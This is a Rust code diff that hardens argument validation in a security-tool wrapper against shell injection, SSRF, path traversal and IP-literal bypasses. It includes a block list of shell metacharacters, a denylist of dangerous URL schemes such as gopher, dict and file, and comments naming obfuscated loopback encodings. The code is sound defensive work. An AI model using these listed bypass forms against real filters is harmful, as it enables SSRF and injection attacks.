@@ -1,6 +1,11 @@
+use crate::hostpolicy::{
+    enforce_cidr_policy, enforce_hostname_policy, enforce_ip_policy, has_punycode_label,
+    looks_like_ip_literal, parse_canonical_ip, parse_cidr,
+};
+use crate::scope::{check_scope, ScopeDef};
 use crate::types::{ArgDef, ToolCladError};
 use regex::Regex;
-use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
+use std::net::{IpAddr, Ipv6Addr};
 use std::sync::LazyLock;
 
 /// Supported argument types for validation.
@@ -27,61 +32,252 @@ const SHELL_METACHARACTERS: &[char] = &[
     '\n', '\r', ';', '|', '&', '$', '`', '(', ')', '{', '}', '[', ']', '<', '>', '!',
 ];
 
-/// Compiled regex for IP address formats. Canonical IPv4/IPv6 are validated by
-/// strict `std::net` parsers; this regex only frames CIDR notation.
-static CIDR_V4_RE: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/(\d{1,2})$").unwrap());
+/// Hostname grammar: LDH labels, no leading or trailing hyphen, no empty
+/// label, no trailing dot. IP literals and CIDRs are parsed by the strict
+/// `crate::hostpolicy` parsers before a value is matched against this.
 static HOSTNAME_RE: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(
         r"^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*$",
     )
     .unwrap()
 });
-static URL_RE: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"^https?://[a-zA-Z0-9\-\.]+(/[^\s]*)?$").unwrap());
+/// Schemes a `url` argument accepts when the manifest sets no `schemes`.
+const DEFAULT_URL_SCHEMES: &[&str] = &["http", "https"];
+
+/// Schemes a `url` argument never accepts, even when a manifest lists one in
+/// `schemes`: each is either a non-network scheme a fetcher would turn into
+/// local file or code access, or a protocol-smuggling vector (gopher and dict
+/// speak raw bytes to an arbitrary port).
+const DENIED_URL_SCHEMES: &[&str] = &[
+    "javascript",
+    "data",
+    "file",
+    "blob",
+    "about",
+    "gopher",
+    "dict",
+    "ftp",
+    "ldap",
+    "jar",
+    "netdoc",
+    "mailto",
+    "ws",
+    "wss",
+];
+
+/// Types whose value is user text handed to the target binary more or less
+/// verbatim. They get the W1.5 hygiene rules (NUL, control characters,
+/// quotes/backslash, whitespace, leading dash) before any type parsing.
+pub const STRING_DERIVED_TYPES: &[&str] = &[
+    "string",
+    "path",
+    "credential_file",
+    "regex_match",
+    "url",
+    "scope_target",
+    "duration",
+    "msf_options",
+];
 
 /// Validate a single argument value against its definition.
 ///
 /// Returns the (possibly transformed) value on success, or a validation error.
+///
+/// This is the strict (template-mode) entry point: `allow_whitespace` is not
+/// honored. Use [`validate_arg_mode`] to validate for a manifest that declared
+/// `command.exec` directly.
 pub fn validate_arg(name: &str, def: &ArgDef, value: &str) -> Result<String, ToolCladError> {
-    let val = value.trim();
+    validate_arg_mode(name, def, value, false)
+}
 
-    // Network-shaped types (hostname, URL, IP, CIDR) reject leading/trailing
-    // whitespace at the source: RFC 1035 / RFC 5891 don't permit terminal
-    // whitespace in labels, and silently trimming would let "example.com "
-    // through to validators that already passed structural checks.
-    let strict_no_whitespace = matches!(
-        def.type_name.as_str(),
-        "scope_target" | "url" | "ip_address" | "cidr"
-    );
-    if strict_no_whitespace && val.len() != value.len() {
+/// Validate a single argument value, stating whether the manifest's command
+/// form is a declared `exec` array (`exec_mode = true`).
+///
+/// `exec_mode` only affects `allow_whitespace`: an `exec` element is one argv
+/// entry that is never re-split, so whitespace inside it is safe to opt into.
+/// A `template` — even one compiled to exec at load — stays strict.
+pub fn validate_arg_mode(
+    name: &str,
+    def: &ArgDef,
+    value: &str,
+    exec_mode: bool,
+) -> Result<String, ToolCladError> {
+    validate_arg_in(name, def, value, exec_mode, None)
+}
+
+/// The full validation entry point: [`validate_arg_mode`] plus the project
+/// scope consulted when the arg sets `scope_check = true` (honored on
+/// `scope_target`, `url`, `ip_address` and `cidr`; see [`crate::scope`]).
+///
+/// A `None` scope with `scope_check = true` refuses the value (fail closed).
+/// The scope check runs last, after hygiene, type parsing and the host/IP
+/// policy, so an in-scope internal target is still refused by
+/// `block_internal`.
+pub fn validate_arg_in(
+    name: &str,
+    def: &ArgDef,
+    value: &str,
+    exec_mode: bool,
+    scope: Option<&ScopeDef>,
+) -> Result<String, ToolCladError> {
+    // Rule 1 applies to every type, enum and numerics included.
+    if value.contains('\0') {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' must not contain NUL bytes"
+        )));
+    }
+
+    let type_name = def.type_name.as_str();
+    if STRING_DERIVED_TYPES.contains(&type_name) {
+        // Hygiene runs on the raw value: nothing is trimmed away first.
+        check_value_hygiene(name, def, value, exec_mode)?;
+        return match type_name {
+            "string" => validate_string(name, def, value, true),
+            "scope_target" => validate_scope_target(name, def, value)
+                .and_then(|out| scope_hook(name, def, scope, &out, &out).map(|_| out)),
+            "url" => validate_url(name, def, value, scope),
+            "path" => validate_path(name, value),
+            "msf_options" => validate_msf_options(name, def, value),
+            "credential_file" => validate_credential_file(name, def, value),
+            "duration" => validate_duration(name, def, value),
+            "regex_match" => validate_regex_match(name, def, value),
+            _ => unreachable!("string-derived type dispatch is exhaustive"),
+        };
+    }
+
+    // Nothing is trimmed: a numeric, boolean, enum, IP or CIDR value with
+    // surrounding whitespace is refused rather than silently normalized.
+    let val = value;
+    if val.trim().len() != val.len() {
         return Err(ToolCladError::ValidationError(format!(
             "argument '{name}' must not contain leading or trailing whitespace"
         )));
     }
 
-    // Apply injection sanitization if requested or for types that require it.
-    match def.type_name.as_str() {
-        "string" => validate_string(name, def, val, true),
-        "integer" => validate_integer(name, def, val),
-        "number" => validate_number(name, def, val),
-        "port" => validate_port(name, val),
+    match type_name {
+        // Numeric types apply the leading-dash rule to the output, after
+        // range checks and clamping, so `-5` with `clamp` and `min = 1`
+        // yields `1` and passes while a bare `-1` is refused.
+        "integer" => validate_integer(name, def, val)
+            .and_then(|out| reject_leading_dash(name, def, &out).map(|_| out)),
+        "number" => validate_number(name, def, val)
+            .and_then(|out| reject_leading_dash(name, def, &out).map(|_| out)),
+        "port" => validate_port(name, val)
+            .and_then(|out| reject_leading_dash(name, def, &out).map(|_| out)),
         "boolean" => validate_boolean(name, val),
         "enum" => validate_enum(name, def, val),
-        "scope_target" => validate_scope_target(name, def, val),
-        "url" => validate_url(name, val),
-        "path" => validate_path(name, val),
-        "ip_address" => validate_ip_address(name, val),
-        "cidr" => validate_cidr(name, val),
-        "msf_options" => validate_msf_options(name, def, val),
-        "credential_file" => validate_credential_file(name, def, val),
-        "duration" => validate_duration(name, def, val),
-        "regex_match" => validate_regex_match(name, def, val),
+        "ip_address" => validate_ip_address(name, def, val)
+            .and_then(|out| scope_hook(name, def, scope, &out, &out).map(|_| out)),
+        "cidr" => validate_cidr(name, def, val)
+            .and_then(|out| scope_hook(name, def, scope, &out, &out).map(|_| out)),
         _ => Err(ToolCladError::ValidationError(format!(
             "unknown argument type '{}' for '{}'",
             def.type_name, name
         ))),
     }
+}
+
+/// Run the scope check on `subject` when the arg sets `scope_check`.
+fn scope_hook(
+    name: &str,
+    def: &ArgDef,
+    scope: Option<&ScopeDef>,
+    subject: &str,
+    value: &str,
+) -> Result<(), ToolCladError> {
+    if def.scope_check {
+        check_scope(name, scope, subject, value)?;
+    }
+    Ok(())
+}
+
+/// True for C0 control characters (U+0000–U+001F), DEL (U+007F), and the C1
+/// range (U+0080–U+009F). Tab, newline, carriage return, vertical tab and form
+/// feed are all included: a tool argument never needs a control byte, and
+/// `\r`/`\n` are the line-injection characters.
+fn is_control_char(c: char) -> bool {
+    let cp = c as u32;
+    cp < 0x20 || (0x7f..=0x9f).contains(&cp)
+}
+
+/// Reject a value that starts with `-` or `+` unless the arg opts in with
+/// `allow_leading_dash = true`. Such a value would otherwise be parsed by the
+/// target binary as an option.
+fn reject_leading_dash(name: &str, def: &ArgDef, value: &str) -> Result<(), ToolCladError> {
+    if !def.allow_leading_dash && (value.starts_with('-') || value.starts_with('+')) {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' must not start with '-' or '+' (set allow_leading_dash = true to permit)"
+        )));
+    }
+    Ok(())
+}
+
+/// W1.5 string-derived value hygiene, checked in order before any
+/// type-specific parsing: control characters, quotes/backslash, whitespace,
+/// leading dash. (NUL is checked by the caller for every type.)
+fn check_value_hygiene(
+    name: &str,
+    def: &ArgDef,
+    value: &str,
+    exec_mode: bool,
+) -> Result<(), ToolCladError> {
+    let type_name = def.type_name.as_str();
+    // `msf_options` needs the space as its `KEY VALUE` separator. A `url`
+    // never contains whitespace, opt-in or not. Everything else may opt in
+    // only when the command form is a declared exec array. Either way the
+    // only whitespace ever admitted is the ASCII space U+0020: a tab or a
+    // newline is line injection, and a non-breaking or ideographic space is a
+    // homoglyph, not a separator.
+    let space_allowed =
+        type_name == "msf_options" || (def.allow_whitespace && exec_mode && type_name != "url");
+
+    // Rule 2 is unconditional; `allow_whitespace` never relaxes it.
+    if value.chars().any(is_control_char) {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' must not contain control characters"
+        )));
+    }
+
+    if type_name == "scope_target" && value.contains('\\') {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' scope_target must not contain backslash escape sequences"
+        )));
+    }
+    if value.contains(['\'', '"', '\\']) {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' must not contain quote or backslash characters"
+        )));
+    }
+
+    if value
+        .chars()
+        .any(|c| c.is_whitespace() && !(space_allowed && c == ' '))
+    {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' must not contain whitespace"
+        )));
+    }
+
+    reject_leading_dash(name, def, value)
+}
+
+/// Anchor a user-supplied pattern so it must match the whole value: strip one
+/// leading `^` and one trailing unescaped `$`, then wrap as `^(?:<pat>)$`.
+/// Without this, `pattern = "[a-z]+"` would accept `abc123`.
+pub fn anchor_pattern(pat: &str) -> String {
+    let inner = pat.strip_prefix('^').unwrap_or(pat);
+    let inner = match inner.strip_suffix('$') {
+        Some(stripped) if !stripped.ends_with('\\') => stripped,
+        _ => inner,
+    };
+    format!("^(?:{inner})$")
+}
+
+/// Compile an arg's `pattern`, anchored, surfacing a bad pattern as a
+/// manifest error.
+fn compile_anchored(name: &str, pat: &str) -> Result<Regex, ToolCladError> {
+    Regex::new(&anchor_pattern(pat))
+        .map_err(|e| ToolCladError::ManifestError(format!("invalid pattern for '{name}': {e}")))
 }
 
 /// Check that a value contains no shell metacharacters.
@@ -106,9 +302,7 @@ fn validate_string(
         reject_injection(name, val)?;
     }
     if let Some(ref pat) = def.pattern {
-        let re = Regex::new(pat).map_err(|e| {
-            ToolCladError::ManifestError(format!("invalid pattern for '{name}': {e}"))
-        })?;
+        let re = compile_anchored(name, pat)?;
         if !re.is_match(val) {
             return Err(ToolCladError::ValidationError(format!(
                 "argument '{name}' does not match pattern '{pat}'"
@@ -118,7 +312,24 @@ fn validate_string(
     Ok(val.to_string())
 }
 
+/// `integer` string form: optional sign, ASCII digits.
+static INTEGER_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^[+-]?[0-9]+$").unwrap());
+/// `number` string form: decimal with optional fraction and exponent. No
+/// `NaN`, `inf`, hex floats or whitespace.
+static NUMBER_RE: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"^[+-]?([0-9]+\.?[0-9]*|\.[0-9]+)([eE][+-]?[0-9]+)?$").unwrap());
+/// `duration`: plain seconds, or `h`/`m`/`s`/`ms` components in that order.
+/// The empty match is refused separately.
+static DURATION_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"^(?:[0-9]+|(?:[0-9]+h)?(?:[0-9]+m)?(?:[0-9]+s)?(?:[0-9]+ms)?)$").unwrap()
+});
+
 fn validate_integer(name: &str, def: &ArgDef, val: &str) -> Result<String, ToolCladError> {
+    if !INTEGER_RE.is_match(val) {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' is not a valid integer"
+        )));
+    }
     let mut n: i64 = val.parse().map_err(|_| {
         ToolCladError::ValidationError(format!("argument '{name}' is not a valid integer"))
     })?;
@@ -149,6 +360,11 @@ fn validate_integer(name: &str, def: &ArgDef, val: &str) -> Result<String, ToolC
 }
 
 fn validate_number(name: &str, def: &ArgDef, val: &str) -> Result<String, ToolCladError> {
+    if !NUMBER_RE.is_match(val) {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' is not a valid number"
+        )));
+    }
     let mut n: f64 = val.parse().map_err(|_| {
         ToolCladError::ValidationError(format!("argument '{name}' is not a valid number"))
     })?;
@@ -187,6 +403,11 @@ fn validate_number(name: &str, def: &ArgDef, val: &str) -> Result<String, ToolCl
 }
 
 fn validate_port(name: &str, val: &str) -> Result<String, ToolCladError> {
+    if val.is_empty() || !val.bytes().all(|b| b.is_ascii_digit()) {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' is not a valid port number"
+        )));
+    }
     let n: u16 = val.parse().map_err(|_| {
         ToolCladError::ValidationError(format!("argument '{name}' is not a valid port number"))
     })?;
@@ -199,10 +420,11 @@ fn validate_port(name: &str, val: &str) -> Result<String, ToolCladError> {
 }
 
 fn validate_boolean(name: &str, val: &str) -> Result<String, ToolCladError> {
-    match val {
-        "true" | "false" => Ok(val.to_string()),
+    let lower = val.to_ascii_lowercase();
+    match lower.as_str() {
+        "true" | "false" => Ok(lower),
         _ => Err(ToolCladError::ValidationError(format!(
-            "argument '{name}' must be exactly 'true' or 'false'"
+            "argument '{name}' must be 'true' or 'false' (case-insensitive)"
         ))),
     }
 }
@@ -257,7 +479,7 @@ fn validate_scope_target(name: &str, def: &ArgDef, val: &str) -> Result<String, 
             "argument '{name}' scope_target must not contain path traversal sequences"
         )));
     }
-    if val.contains('/') && !CIDR_V4_RE.is_match(val) && val.parse::<std::net::IpAddr>().is_err() {
+    if val.contains('/') && parse_cidr(val).is_none() {
         return Err(ToolCladError::ValidationError(format!(
             "argument '{name}' scope_target must not contain '/' (use CIDR notation for ranges)"
         )));
@@ -296,28 +518,15 @@ fn validate_scope_target(name: &str, def: &ArgDef, val: &str) -> Result<String, 
     // 0x7f000001, 0177.0.0.1, 127.1 — all of which a libc resolver would expand
     // to 127.0.0.1) fail here and are rejected as non-canonical literals below.
     if let Some(ip) = parse_canonical_ip(val) {
-        if def.block_internal {
-            if let Some(reason) = non_public_ip_reason(&ip) {
-                return Err(ToolCladError::ValidationError(format!(
-                    "argument '{name}' scope_target {reason} (blocked by block_internal policy)"
-                )));
-            }
-        }
+        enforce_ip_policy(name, &ip, def.block_internal)?;
         return Ok(val.to_string());
     }
 
-    // CIDR ranges. Range-check the base address under policy.
-    if let Some(caps) = CIDR_V4_RE.captures(val) {
-        if let Ok(base) = caps[1].parse::<Ipv4Addr>() {
-            if def.block_internal {
-                if let Some(reason) = non_public_ip_reason(&IpAddr::V4(base)) {
-                    return Err(ToolCladError::ValidationError(format!(
-                        "argument '{name}' scope_target CIDR base {reason} (blocked by block_internal policy)"
-                    )));
-                }
-            }
-            return Ok(val.to_string());
-        }
+    // CIDR ranges (IPv4 or IPv6, strictly framed): the whole range is tested
+    // for overlap with the blocked prefixes, not just its base address.
+    if let Some(net) = parse_cidr(val) {
+        enforce_cidr_policy(name, &net, def.block_internal)?;
+        return Ok(val.to_string());
     }
 
     // A non-canonical IP-literal encoding must not slip through as a "hostname":
@@ -331,35 +540,17 @@ fn validate_scope_target(name: &str, def: &ArgDef, val: &str) -> Result<String, 
 
     // Hostname: structural regex plus a non-numeric rightmost label — no valid
     // TLD is all digits (RFC 3696 §2), which also rejects dotted-decimal IPs.
-    if HOSTNAME_RE.is_match(val) && tld_not_all_numeric(val) {
-        Ok(val.to_string())
-    } else {
-        Err(ToolCladError::ValidationError(format!(
+    if !(HOSTNAME_RE.is_match(val) && tld_not_all_numeric(val)) {
+        return Err(ToolCladError::ValidationError(format!(
             "argument '{name}' is not a valid scope target (IP, CIDR, or hostname)"
-        )))
+        )));
     }
-}
 
-/// Parse only canonical IP text (dotted-quad IPv4 / standard IPv6). Rejects
-/// integer, hex, octal, and shorthand encodings by construction.
-fn parse_canonical_ip(val: &str) -> Option<IpAddr> {
-    val.parse::<Ipv4Addr>()
-        .map(IpAddr::V4)
-        .or_else(|_| val.parse::<Ipv6Addr>().map(IpAddr::V6))
-        .ok()
-}
-
-/// True if `val` is an attempt at an IP literal in a non-canonical encoding:
-/// a `0x…` hex form, or every dot-separated label is all ASCII digits
-/// (integer / dotted-decimal / octal / shorthand). Canonical IPs are handled
-/// earlier and never reach here.
-fn looks_like_ip_literal(val: &str) -> bool {
-    let lower = val.to_ascii_lowercase();
-    if lower.starts_with("0x") {
-        return true;
-    }
-    val.split('.')
-        .all(|label| !label.is_empty() && label.bytes().all(|b| b.is_ascii_digit()))
+    // A well-formed name: internal-name denylist (always), embedded IP
+    // literal (treated as that address), and under `block_internal` DNS
+    // resolution with the range policy applied to every answer.
+    enforce_hostname_policy(name, val, def.block_internal)?;
+    Ok(val.to_string())
 }
 
 /// True if the rightmost DNS label is not entirely numeric (a real TLD is never
@@ -371,70 +562,199 @@ fn tld_not_all_numeric(val: &str) -> bool {
     }
 }
 
-/// Returns a reason string if `ip` is a non-public address that SSRF defenses
-/// should block: loopback, private, link-local (incl. cloud metadata), etc.
-/// IPv6 v4-mapped addresses are unwrapped so `::ffff:127.0.0.1` is caught.
-fn non_public_ip_reason(ip: &IpAddr) -> Option<&'static str> {
-    let v4 = match ip {
-        IpAddr::V4(a) => Some(*a),
-        IpAddr::V6(a) => a.to_ipv4_mapped(),
+/// The host part of a URL authority, split from its optional port.
+#[derive(Debug, PartialEq, Eq)]
+struct UrlHost<'a> {
+    host: &'a str,
+    /// Validated port, when one was written.
+    port: Option<u16>,
+    /// Set when the host was a bracketed IPv6 literal, already parsed.
+    bracketed_v6: Option<Ipv6Addr>,
+}
+
+/// Split a URL authority (everything between `://` and the first `/`, `?` or
+/// `#`, with userinfo already refused) into host and port. A bracketed IPv6
+/// literal is unwrapped; an unbracketed one is ambiguous with a port and
+/// refused. A written port must be 1–65535 in plain decimal digits.
+fn split_url_authority<'a>(name: &str, authority: &'a str) -> Result<UrlHost<'a>, ToolCladError> {
+    let malformed_v6 = || {
+        ToolCladError::ValidationError(format!(
+            "argument '{name}' URL has a malformed bracketed IPv6 host"
+        ))
     };
-    if let Some(a) = v4 {
-        return if a.is_loopback() {
-            Some("resolves to a loopback address")
-        } else if a.is_private() {
-            Some("resolves to a private address")
-        } else if a.is_link_local() {
-            Some("resolves to a link-local address (e.g. cloud metadata 169.254.169.254)")
-        } else if a.is_unspecified() {
-            Some("is the unspecified address 0.0.0.0")
-        } else if a.is_broadcast() {
-            Some("is the broadcast address")
-        } else if a.is_documentation() {
-            Some("is a documentation-range address")
-        } else {
-            None
+
+    let (host, port_text, bracketed_v6) = if let Some(after_open) = authority.strip_prefix('[') {
+        let (inner, after_close) = after_open.split_once(']').ok_or_else(malformed_v6)?;
+        let port_text = match after_close {
+            "" => None,
+            p => Some(p.strip_prefix(':').ok_or_else(malformed_v6)?),
         };
-    }
-    if let IpAddr::V6(a) = ip {
-        if a.is_loopback() {
-            return Some("resolves to the IPv6 loopback ::1");
-        }
-        if a.is_unspecified() {
-            return Some("is the IPv6 unspecified address ::");
-        }
-        let first = a.segments()[0];
-        if (first & 0xfe00) == 0xfc00 {
-            return Some("is an IPv6 unique-local address (fc00::/7)");
-        }
-        if (first & 0xffc0) == 0xfe80 {
-            return Some("is an IPv6 link-local address (fe80::/10)");
-        }
-    }
-    None
-}
-
-/// Returns true if any DNS label in `host` is an A-label (`xn--…`).
-/// Comparison is case-insensitive per IDNA: `XN--`, `Xn--`, `xN--` all count.
-fn has_punycode_label(host: &str) -> bool {
-    host.split('.')
-        .any(|label| label.len() >= 4 && label.as_bytes()[..4].eq_ignore_ascii_case(b"xn--"))
-}
-
-fn validate_url(name: &str, val: &str) -> Result<String, ToolCladError> {
-    reject_injection(name, val)?;
-    if URL_RE.is_match(val) {
-        Ok(val.to_string())
+        let v6 = inner.parse::<Ipv6Addr>().map_err(|_| {
+            ToolCladError::ValidationError(format!(
+                "argument '{name}' URL bracketed host is not a valid IPv6 literal"
+            ))
+        })?;
+        (inner, port_text, Some(v6))
     } else {
-        Err(ToolCladError::ValidationError(format!(
-            "argument '{name}' is not a valid URL"
-        )))
+        match authority.rsplit_once(':') {
+            Some((h, p)) => (h, Some(p), None),
+            None => (authority, None, None),
+        }
+    };
+
+    if host.is_empty() {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' URL has an empty host"
+        )));
     }
+    if bracketed_v6.is_none() && host.contains(':') {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' URL IPv6 host must be enclosed in brackets"
+        )));
+    }
+
+    let port = match port_text {
+        None => None,
+        Some(p) => {
+            // Plain decimal only: `u16::from_str` would accept a leading `+`.
+            let parsed = if !p.is_empty() && p.bytes().all(|b| b.is_ascii_digit()) {
+                p.parse::<u16>().ok().filter(|n| *n >= 1)
+            } else {
+                None
+            };
+            Some(parsed.ok_or_else(|| {
+                ToolCladError::ValidationError(format!(
+                    "argument '{name}' URL port must be 1-65535"
+                ))
+            })?)
+        }
+    };
+
+    Ok(UrlHost {
+        host,
+        port,
+        bracketed_v6,
+    })
+}
+
+/// The `url` validator, in order: the string-derived hygiene has already run
+/// (whitespace is never admitted for a `url`, opt-in or not); then the shell
+/// metacharacter blocklist, which rejects `{` and `}` and therefore any
+/// `{_secret:…}` reference; then a structural parse — `scheme://`, the scheme
+/// allowlist, the scheme denylist, no userinfo, host extraction with an
+/// optional port — and finally the host policy of `crate::hostpolicy`.
+///
+/// This is deliberately not a WHATWG / RFC 3986 normalizer. The fetcher
+/// downstream will parse the value again with its own rules, so anything a
+/// human reviewer of the manifest could misread is refused here rather than
+/// normalized away.
+fn validate_url(
+    name: &str,
+    def: &ArgDef,
+    val: &str,
+    scope: Option<&ScopeDef>,
+) -> Result<String, ToolCladError> {
+    reject_injection(name, val)?;
+
+    // Step 2: `scheme://rest`.
+    let Some((scheme, rest)) = val.split_once("://") else {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' is not a valid URL (expected scheme://host)"
+        )));
+    };
+    let scheme = scheme.to_ascii_lowercase();
+
+    // Step 3: allowlist — the manifest's `schemes` when set, else http/https.
+    let allowed: Vec<String> = if def.schemes.is_empty() {
+        DEFAULT_URL_SCHEMES.iter().map(|s| s.to_string()).collect()
+    } else {
+        def.schemes.iter().map(|s| s.to_ascii_lowercase()).collect()
+    };
+    if !allowed.contains(&scheme) {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' URL scheme '{scheme}' is not permitted (allowed: {})",
+            allowed.join(", ")
+        )));
+    }
+
+    // Step 4: explicit denial, even when a manifest lists the scheme.
+    if DENIED_URL_SCHEMES.contains(&scheme.as_str()) {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' URL scheme '{scheme}' is never permitted for a url argument"
+        )));
+    }
+
+    // Step 5: the authority ends at the first `/`, `?` or `#`. An `@` before
+    // that is userinfo, which hides the real host from a reviewer.
+    let authority_end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
+    let authority = &rest[..authority_end];
+    if authority.contains('@') {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' URL must not contain userinfo (user:pass@host)"
+        )));
+    }
+
+    // Step 6: host and optional port.
+    let UrlHost {
+        host,
+        port: _,
+        bracketed_v6,
+    } = split_url_authority(name, authority)?;
+
+    // Step 7: host policy — the same checks as `scope_target`, since curl and
+    // wget-style fetchers are the prime SSRF vector.
+    if has_punycode_label(host) {
+        return Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' URL host must not contain punycode (xn--) labels"
+        )));
+    }
+    let ip = bracketed_v6
+        .map(IpAddr::V6)
+        .or_else(|| parse_canonical_ip(host));
+    match ip {
+        Some(ip) => enforce_ip_policy(name, &ip, def.block_internal)?,
+        None => {
+            if !host.is_ascii() {
+                return Err(ToolCladError::ValidationError(format!(
+                    "argument '{name}' URL host must be ASCII (IDN hostnames are rejected to prevent homoglyph bypass)"
+                )));
+            }
+            if looks_like_ip_literal(host) {
+                return Err(ToolCladError::ValidationError(format!(
+                    "argument '{name}' URL host looks like a non-canonical IP literal; use dotted-quad IPv4 or a hostname"
+                )));
+            }
+            if host.len() > SCOPE_TARGET_MAX_LEN || host.split('.').any(|label| label.len() > 63) {
+                return Err(ToolCladError::ValidationError(format!(
+                    "argument '{name}' URL host exceeds DNS length limits (RFC 1035 §2.3.4)"
+                )));
+            }
+            if !HOSTNAME_RE.is_match(host) {
+                return Err(ToolCladError::ValidationError(format!(
+                    "argument '{name}' URL host is not a valid hostname or IP literal"
+                )));
+            }
+            // The same name rules as `scope_target`: internal-name denylist
+            // (always), embedded IP literal (treated as that address), and
+            // under `block_internal` DNS resolution of every answer.
+            enforce_hostname_policy(name, host, def.block_internal)?;
+        }
+    }
+
+    // Step 8: the project scope, checked against the host.
+    scope_hook(name, def, scope, host, val)?;
+
+    Ok(val.to_string())
+}
+
+/// True if `..` is a whole path component, splitting on `/` and `\\`.
+fn has_parent_component(val: &str) -> bool {
+    val.split(['/', '\\']).any(|c| c == "..")
 }
 
 fn validate_path(name: &str, val: &str) -> Result<String, ToolCladError> {
     reject_injection(name, val)?;
-    if val.contains("../") || val.contains("..\\") {
+    if has_parent_component(val) {
         return Err(ToolCladError::ValidationError(format!(
             "argument '{name}' path must not contain traversal sequences (../)"
         )));
@@ -448,37 +768,33 @@ fn validate_path(name: &str, val: &str) -> Result<String, ToolCladError> {
     Ok(val.to_string())
 }
 
-fn validate_ip_address(name: &str, val: &str) -> Result<String, ToolCladError> {
-    if val.parse::<Ipv4Addr>().is_ok() || val.parse::<Ipv6Addr>().is_ok() {
-        Ok(val.to_string())
-    } else {
-        Err(ToolCladError::ValidationError(format!(
+/// A canonical IPv4 or IPv6 literal, under the same egress policy as every
+/// other address-carrying type: link-local is always refused, the rest of the
+/// non-public table under `block_internal`.
+fn validate_ip_address(name: &str, def: &ArgDef, val: &str) -> Result<String, ToolCladError> {
+    match parse_canonical_ip(val) {
+        Some(ip) => {
+            enforce_ip_policy(name, &ip, def.block_internal)?;
+            Ok(val.to_string())
+        }
+        None => Err(ToolCladError::ValidationError(format!(
             "argument '{name}' is not a valid IP address"
-        )))
+        ))),
     }
 }
 
-fn validate_cidr(name: &str, val: &str) -> Result<String, ToolCladError> {
-    if let Some(caps) = CIDR_V4_RE.captures(val) {
-        let ip_part = &caps[1];
-        let prefix: u8 = caps[2].parse().map_err(|_| {
-            ToolCladError::ValidationError(format!("argument '{name}' has invalid CIDR prefix"))
-        })?;
-        if ip_part.parse::<Ipv4Addr>().is_err() {
-            return Err(ToolCladError::ValidationError(format!(
-                "argument '{name}' has invalid IPv4 address in CIDR"
-            )));
+/// A strictly framed IPv4 or IPv6 CIDR (canonical base, plain decimal prefix
+/// within the family's bound). The whole range is tested for overlap with
+/// every blocked prefix: link-local always, the rest under `block_internal`.
+fn validate_cidr(name: &str, def: &ArgDef, val: &str) -> Result<String, ToolCladError> {
+    match parse_cidr(val) {
+        Some(net) => {
+            enforce_cidr_policy(name, &net, def.block_internal)?;
+            Ok(val.to_string())
         }
-        if prefix > 32 {
-            return Err(ToolCladError::ValidationError(format!(
-                "argument '{name}' CIDR prefix must be 0-32"
-            )));
-        }
-        Ok(val.to_string())
-    } else {
-        Err(ToolCladError::ValidationError(format!(
-            "argument '{name}' is not valid CIDR notation (e.g. 10.0.0.0/24)"
-        )))
+        None => Err(ToolCladError::ValidationError(format!(
+            "argument '{name}' is not valid CIDR notation (e.g. 10.0.0.0/24 or 2001:db8::/32)"
+        ))),
     }
 }
 
@@ -522,7 +838,7 @@ fn validate_credential_file(name: &str, _def: &ArgDef, val: &str) -> Result<Stri
             "argument '{name}' must be a relative path"
         )));
     }
-    if val.contains("../") || val.contains("..\\") {
+    if has_parent_component(val) {
         return Err(ToolCladError::ValidationError(format!(
             "argument '{name}' path must not contain traversal sequences"
         )));
@@ -542,13 +858,7 @@ fn validate_credential_file(name: &str, _def: &ArgDef, val: &str) -> Result<Stri
 }
 
 fn validate_duration(name: &str, _def: &ArgDef, val: &str) -> Result<String, ToolCladError> {
-    // Try plain integer (seconds)
-    if val.parse::<u64>().is_ok() {
-        return Ok(val.to_string());
-    }
-    // Parse duration suffixes: ms, s, m, h
-    let duration_re = Regex::new(r"^(?:(\d+)h)?(?:(\d+)m)?(?:(\d+)s)?(?:(\d+)ms)?$").unwrap();
-    if !duration_re.is_match(val) {
+    if val.is_empty() || !DURATION_RE.is_match(val) {
         return Err(ToolCladError::ValidationError(format!(
             "argument '{name}' is not a valid duration (e.g. '30', '5m', '2h', '1h30m', '500ms')"
         )));
@@ -563,8 +873,7 @@ fn validate_regex_match(name: &str, def: &ArgDef, val: &str) -> Result<String, T
             "argument '{name}' is type 'regex_match' but has no 'pattern' field"
         ))
     })?;
-    let re = Regex::new(pat)
-        .map_err(|e| ToolCladError::ManifestError(format!("invalid pattern for '{name}': {e}")))?;
+    let re = compile_anchored(name, pat)?;
     if !re.is_match(val) {
         return Err(ToolCladError::ValidationError(format!(
             "argument '{name}' does not match required pattern '{pat}'"
@@ -576,52 +885,90 @@ fn validate_regex_match(name: &str, def: &ArgDef, val: &str) -> Result<String, T
 /// Validate an argument using custom type definitions.
 /// If the arg type matches a custom type, create a synthetic ArgDef from the custom type
 /// and delegate to the base type validator.
+///
+/// Strict (template-mode) entry point; see [`validate_arg_with_custom_types_mode`].
